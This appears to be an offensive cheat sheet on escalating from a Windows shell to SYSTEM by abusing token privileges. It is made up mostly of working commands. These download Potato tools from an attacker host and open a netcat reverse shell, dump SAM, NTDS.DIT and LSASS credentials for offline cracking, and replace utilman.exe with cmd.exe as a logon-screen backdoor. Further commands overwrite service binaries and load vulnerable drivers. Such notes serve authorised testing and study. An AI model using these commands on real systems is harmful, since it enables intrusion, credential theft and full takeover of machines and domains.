# Windows Privilege Abuse

!!! tip "Tip"
    `whoami /priv` is the first command after landing a Windows shell. Any of SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug, SeTakeOwnership, or SeLoadDriver maps to a concrete local-to-SYSTEM path. Walk them in that order.

!!! warning "Watch out"
    Many Potato variants rely on the Print Spooler service. It's disabled by default on Server 2019+ after PrintNightmare. Check `Get-Service Spooler` — if stopped/disabled, skip PrintSpoofer and jump to GodPotato or SharpEfsPotato.

---

## Privilege → Technique Map

| Privilege | Technique | Tool |
|---|---|---|
| SeImpersonate | Token theft via named-pipe trick | PrintSpoofer, GodPotato, SharpEfsPotato, RoguePotato |
| SeAssignPrimaryToken | Same as SeImpersonate | Same tools |
| SeBackup | Read any file (SAM, SYSTEM, NTDS.DIT) | `robocopy /b`, `reg save` |
| SeRestore | Write any file (replace service binary) | `robocopy /b` |
| SeDebug | Attach to any process (LSASS) | Mimikatz, procdump |
| SeTakeOwnership | Take ownership then grant self rights | `takeown.exe`, `icacls` |
| SeLoadDriver | Load signed driver → kernel code | Capcom.sys, eoploader |
| SeManageVolume | Gain full access to C:\\ | SeManageVolumeExploit |

---

## SeImpersonatePrivilege

```cmd
whoami /priv | findstr /i "SeImpersonate"
```

### GodPotato (Windows Server 2012 – 2022, Windows 8 – 11)

Most reliable modern Potato — no Print Spooler, no DNS requirement, works across all current Windows versions where SeImpersonate is held.

```powershell
iwr http://<attacker-ip>/GodPotato.exe -OutFile C:\Temp\GodPotato.exe
C:\Temp\GodPotato.exe -cmd "cmd /c whoami"
C:\Temp\GodPotato.exe -cmd "C:\Temp\nc.exe <attacker-ip> 4444 -e cmd.exe"
```

### PrintSpoofer (Windows 10 1809+ / Server 2019 — requires Spooler)

```powershell
iwr http://<attacker-ip>/PrintSpoofer.exe -OutFile C:\Temp\PrintSpoofer.exe
C:\Temp\PrintSpoofer.exe -i -c cmd
```

### SharpEfsPotato (No Spooler, No DNS)

Fallback when Spooler is disabled. Abuses EFSRPC.

```powershell
iwr http://<attacker-ip>/SharpEfsPotato.exe -OutFile C:\Temp\SharpEfsPotato.exe
C:\Temp\SharpEfsPotato.exe -p cmd.exe -a "/c whoami"
```

### Juicy Potato (Legacy — Windows < 10 1809 / Server 2016)

```powershell
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

---

## SeBackupPrivilege / SeRestorePrivilege

Grants read (SeBackup) or write (SeRestore) of any file, bypassing ACLs. Both are held by the `Backup Operators` group — a frequent finding on domain-joined servers where operators need to back up the OS without being admin.

### Read SAM/SYSTEM hives → domain hashes offline

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save
```

`reg save` respects SeBackupPrivilege — works without being admin.

Transfer and extract on attacker machine:

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### On a Domain Controller — dump NTDS

With SeBackup on a DC, copy the live NTDS.DIT and SYSTEM hive:

```powershell
# diskshadow scripted shadow copy (no GUI)
echo set context persistent nowriters > C:\Temp\diskshadow.txt
echo add volume C: alias someAlias >> C:\Temp\diskshadow.txt
echo create >> C:\Temp\diskshadow.txt
echo expose %someAlias% Z: >> C:\Temp\diskshadow.txt
diskshadow /s C:\Temp\diskshadow.txt

# Copy with backup semantics (SeBackup bypasses ACLs)
robocopy /b Z:\Windows\NTDS C:\Temp\ntds ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.save
```

Extract hashes offline:

```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```

### Write-based escalation (SeRestore)

Replace a SYSTEM-run binary or DLL using `robocopy /b`:

```cmd
robocopy /b C:\Temp\malicious.exe "C:\Program Files\TargetApp\" service.exe
```

---

## SeDebugPrivilege

```cmd
whoami /priv | findstr /i "SeDebug"
```

### Dump LSASS

```powershell
# comsvcs.dll LOLBIN (no mimikatz on disk)
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe comsvcs.dll, MiniDump <lsass-pid> C:\Temp\lsass.dmp full
```

Parse offline:

```bash
pypykatz lsa minidump lsass.dmp
```

### Token Impersonation → SYSTEM Shell

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # process::list
mimikatz # process::open winlogon.exe
```

---

## SeTakeOwnershipPrivilege

Take ownership of any file, then grant yourself full control:

```cmd
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant <user>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Then press Win+U at the logon screen for SYSTEM cmd
```

---

## SeLoadDriverPrivilege

Load a signed-but-vulnerable driver to execute arbitrary kernel code. Historically abused via `Capcom.sys` — now any driver on [loldrivers.io](https://www.loldrivers.io/) works.

```powershell
# EoPLoadDriver is the standard PoC
EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
```

Then use the driver's exploit primitive (varies by driver) to run shellcode as SYSTEM.

---

## SeManageVolumePrivilege

Grants full control over `C:\`. Confirmed primitive via [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit):

```powershell
SeManageVolumeExploit.exe
# Now you have write access to protected folders — drop a DLL hijack
```
